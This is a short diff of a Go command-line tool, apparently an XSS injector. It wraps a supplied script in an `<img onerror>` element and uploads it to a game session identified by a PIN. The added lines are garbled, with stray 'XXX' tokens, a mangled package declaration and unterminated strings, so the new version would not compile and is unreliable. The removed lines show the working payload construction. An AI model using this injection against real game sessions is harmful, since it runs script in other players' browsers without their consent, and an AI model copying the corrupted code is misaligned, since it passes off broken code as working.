@@ -1,7 +1,7 @@
-package main
+package main.go spel-pin alert/
 
 import (
-	"fmt"
+	"fmt" XXX
 	"os"
 	"strconv"
 	"strings"
@@ -15,7 +15,7 @@ var wg sync.WaitGroup
 
 func main() {
 	if len(os.Args) != 3 {
-		fmt.Fprintln(os.Stderr, "Usage: xss <game pin> <script>")
+		fmt.Fprintln(os.Stderr, "Usage: xss <game pin> <script>XXX
 		os.Exit(1)
 	}
 	gamePin, err := strconv.Atoi(os.Args[1])
@@ -24,7 +24,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	elementText := `<img src="" onerror="` + escapeScript(os.Args[2]) + `">`
+	elementText := `<img src="" onerror="` + escapeScript XXX
 
 	uploadInjectionString(gamePin, elementText)
 	d1, d2 := computeDelays(1)
